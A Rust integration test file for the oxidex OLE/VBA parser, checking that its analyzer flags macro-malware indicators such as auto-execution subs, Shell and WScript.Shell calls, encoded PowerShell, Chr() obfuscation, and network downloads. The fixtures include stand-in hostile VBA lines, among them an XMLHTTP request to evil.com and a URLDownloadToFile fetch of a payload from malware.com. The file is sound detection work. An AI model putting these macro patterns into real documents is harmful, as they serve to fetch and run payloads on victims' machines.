//! OLE/VBA parser integration tests
//!
//! Comprehensive tests for OLE (Compound File Binary Format) parsing and VBA macro
//! forensic analysis, including detection of suspicious patterns used in malware.

#[path = "../common/mod.rs"]
mod common;

use common::TestReader;
use oxidex::core::FormatParser;
use oxidex::parsers::archive::ole::{OLEParser, VBAAnalyzer};

// ============================================================================
// Test 1: Detect Auto_Open pattern (auto-execution)
// ============================================================================

#[test]
fn test_suspicious_auto_open() {
    let code = b"Sub Auto_Open()\n  Shell \"cmd /c calc\"\nEnd Sub";
    let patterns = VBAAnalyzer::check_suspicious_patterns(code);

    // Should detect both Auto_Open and Shell patterns
    assert!(
        patterns.iter().any(|p| p.contains("Auto_Open")),
        "Failed to detect Auto_Open pattern. Found: {:?}",
        patterns
    );

    assert!(
        patterns.iter().any(|p| p.contains("Shell")),
        "Failed to detect Shell pattern. Found: {:?}",
        patterns
    );
}

// ============================================================================
// Test 2: Detect WScript.Shell and CreateObject
// ============================================================================

#[test]
fn test_suspicious_wscript() {
    let code = b"Set obj = CreateObject(\"WScript.Shell\")\nobj.Run \"cmd\"";
    let patterns = VBAAnalyzer::check_suspicious_patterns(code);

    // Should detect WScript.Shell and CreateObject
    assert!(
        patterns
            .iter()
            .any(|p| p.contains("WScript") || p.contains("CreateObject")),
        "Failed to detect WScript.Shell or CreateObject patterns. Found: {:?}",
        patterns
    );

    // Verify we get multiple suspicious indicators
    assert!(
        patterns.len() >= 1,
        "Expected at least one suspicious pattern"
    );
}

// ============================================================================
// Test 3: Detect PowerShell and -encodedcommand
// ============================================================================

#[test]
fn test_suspicious_powershell() {
    let code = b"Shell \"powershell -encodedcommand ABC123\"";
    let patterns = VBAAnalyzer::check_suspicious_patterns(code);

    // Should detect PowerShell patterns
    assert!(
        patterns.iter().any(|p| p.contains("PowerShell")),
        "Failed to detect PowerShell pattern. Found: {:?}",
        patterns
    );

    // Should also detect the encoded command aspect
    assert!(
        patterns
            .iter()
            .any(|p| p.contains("Encoded") || p.contains("encodedcommand")),
        "Failed to detect encoded command pattern. Found: {:?}",
        patterns
    );
}

// ============================================================================
// Test 4: Detect XMLHTTP and network access
// ============================================================================

#[test]
fn test_suspicious_network() {
    let code =
        b"Set http = CreateObject(\"MSXML2.XMLHTTP\")\nhttp.Open \"GET\", \"http://evil.com\"";
    let patterns = VBAAnalyzer::check_suspicious_patterns(code);

    // Should detect network access patterns (XMLHTTP or CreateObject)
    assert!(
        patterns
            .iter()
            .any(|p| p.contains("XMLHTTP") || p.contains("Network") || p.contains("CreateObject")),
        "Failed to detect network access patterns. Found: {:?}",
        patterns
    );
}

// ============================================================================
// Test 5: Detect obfuscation via Chr() functions
// ============================================================================

#[test]
fn test_suspicious_obfuscation() {
    let code = b"x = Chr(72) & Chr(101) & Chr(108) & Chr(108) & Chr(111)";
    let patterns = VBAAnalyzer::check_suspicious_patterns(code);

    // Should detect Chr() obfuscation pattern
    assert!(
        patterns.iter().any(|p| p.contains("Chr")),
        "Failed to detect Chr() obfuscation. Found: {:?}",
        patterns
    );
}

// ============================================================================
// Test 6: Detect excessive string concatenation (obfuscation indicator)
// ============================================================================

#[test]
fn test_excessive_concatenation() {
    // Build code with more than 20 concatenation operators
    let mut code = String::from("x = \"a\"");
    for _ in 0..30 {
        code.push_str(" & \"b\"");
    }

    let patterns = VBAAnalyzer::check_suspicious_patterns(code.as_bytes());

    // Should detect the excessive concatenation
    assert!(
        patterns.iter().any(|p| p.contains("concatenation")),
        "Failed to detect excessive concatenation pattern (30 instances). Found: {:?}",
        patterns
    );

    // Verify we count the concatenations correctly
    let concat_pattern = patterns
        .iter()
        .find(|p| p.contains("concatenation"))
        .unwrap();
    assert!(
        concat_pattern.contains("30") || concat_pattern.contains("31"),
        "Concatenation count incorrect: {}",
        concat_pattern
    );
}

// ============================================================================
// Test 7: Verify minimal false positives on clean code
// ============================================================================

#[test]
fn test_clean_vba_code() {
    let code =
        b"Sub CalculateSum()\n  Dim total As Integer\n  total = 1 + 2 + 3\n  MsgBox total\nEnd Sub";
    let patterns = VBAAnalyzer::check_suspicious_patterns(code);

    // Filter out known false positives (Open is a common pattern)
    let serious_patterns: Vec<_> = patterns
        .iter()
        .filter(|p| !p.contains("File: Open"))
        .collect();

    assert!(
        serious_patterns.is_empty(),
        "Clean code incorrectly flagged as suspicious: {:?}",
        serious_patterns
    );
}

// ============================================================================
// Test 8: Verify OLE parser fails on invalid signature
// ============================================================================

#[test]
fn test_ole_invalid_signature() {
    // Create test data with invalid OLE signature
    let data = vec![0u8; 512];
    let reader = TestReader::new(data);
    let parser = OLEParser;

    // Should fail to parse invalid OLE file
    let result = parser.parse(&reader);
    assert!(
        result.is_err(),
        "Parser should reject file with invalid OLE signature"
    );
}

// ============================================================================
// Additional edge case tests
// ============================================================================

/// Test multiple auto-execution patterns together
#[test]
fn test_multiple_auto_exec_patterns() {
    let code =
        b"Sub AutoOpen()\nEnd Sub\nSub Document_Open()\nEnd Sub\nSub Workbook_Open()\nEnd Sub";
    let patterns = VBAAnalyzer::check_suspicious_patterns(code);

    // Should detect at least some auto-execution patterns
    let auto_exec_count = patterns.iter().filter(|p| p.contains("AutoExec")).count();
    assert!(
        auto_exec_count >= 2,
        "Expected multiple auto-exec patterns, found: {:?}",
        patterns
    );
}

/// Test shell execution variants
#[test]
fn test_shell_execution_variants() {
    let code = b"Shell \"cmd.exe\"\nGetObject \"path\"\nCreateObject \"whatever\"";
    let patterns = VBAAnalyzer::check_suspicious_patterns(code);

    // Should detect multiple shell-related patterns
    let shell_patterns: Vec<_> = patterns
        .iter()
        .filter(|p| p.contains("Shell") || p.contains("CreateObject") || p.contains("GetObject"))
        .collect();

    assert!(
        !shell_patterns.is_empty(),
        "Failed to detect shell execution patterns. Found: {:?}",
        patterns
    );
}

/// Test case-insensitive pattern matching
#[test]
fn test_case_insensitive_patterns() {
    let code = b"POWERSHELL -ENCODEDCOMMAND ABC";
    let patterns = VBAAnalyzer::check_suspicious_patterns(code);

    // PowerShell patterns should be case-insensitive
    assert!(
        patterns.iter().any(|p| p.contains("PowerShell")),
        "Case-insensitive pattern matching failed. Found: {:?}",
        patterns
    );
}

/// Test WinHttp as alternative network pattern
#[test]
fn test_winhttp_network_detection() {
    let code = b"Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\")";
    let patterns = VBAAnalyzer::check_suspicious_patterns(code);

    // Should detect WinHttp network access
    assert!(
        patterns
            .iter()
            .any(|p| p.contains("WinHttp") || p.contains("Network") || p.contains("CreateObject")),
        "Failed to detect WinHttp pattern. Found: {:?}",
        patterns
    );
}

/// Test Chr$ and ChrW variants
#[test]
fn test_chr_variants() {
    let code_chrw = b"Chr$(65) & ChrW(66)";
    let patterns = VBAAnalyzer::check_suspicious_patterns(code_chrw);

    // Should detect Chr$ or ChrW obfuscation
    assert!(
        patterns
            .iter()
            .any(|p| p.contains("Chr") || p.contains("Obfuscation")),
        "Failed to detect Chr$ or ChrW variants. Found: {:?}",
        patterns
    );
}

/// Test boundary case: exactly 20 concatenations (should not trigger)
#[test]
fn test_concatenation_boundary_exactly_20() {
    let mut code = String::from("x = \"a\"");
    for _ in 0..20 {
        code.push_str(" & \"b\"");
    }

    let patterns = VBAAnalyzer::check_suspicious_patterns(code.as_bytes());

    // 20 concatenations should NOT trigger (threshold is >20)
    let has_concat_alert = patterns.iter().any(|p| p.contains("concatenation"));
    assert!(
        !has_concat_alert,
        "Exactly 20 concatenations should not trigger alert"
    );
}

/// Test boundary case: 21 concatenations (should trigger)
#[test]
fn test_concatenation_boundary_21() {
    let mut code = String::from("x = \"a\"");
    for _ in 0..21 {
        code.push_str(" & \"b\"");
    }

    let patterns = VBAAnalyzer::check_suspicious_patterns(code.as_bytes());

    // 21 concatenations SHOULD trigger alert
    assert!(
        patterns.iter().any(|p| p.contains("concatenation")),
        "21 concatenations should trigger alert"
    );
}

/// Test URL download pattern
#[test]
fn test_url_download_pattern() {
    let code = b"URLDownloadToFile \"http://malware.com/payload.exe\"";
    let patterns = VBAAnalyzer::check_suspicious_patterns(code);

    // Should detect URLDownloadToFile network pattern
    assert!(
        patterns
            .iter()
            .any(|p| p.contains("URLDownloadToFile") || p.contains("Network")),
        "Failed to detect URLDownloadToFile pattern. Found: {:?}",
        patterns
    );
}

/// Test FileSystemObject pattern
#[test]
fn test_file_system_object() {
    let code = b"Set fso = CreateObject(\"Scripting.FileSystemObject\")\nSet file = fso.CreateTextFile(\"test.txt\")";
    let patterns = VBAAnalyzer::check_suspicious_patterns(code);

    // Should detect file system access patterns
    assert!(
        patterns.iter().any(|p| p.contains("FileSystem")
            || p.contains("CreateTextFile")
            || p.contains("File:")),
        "Failed to detect file access patterns. Found: {:?}",
        patterns
    );
}
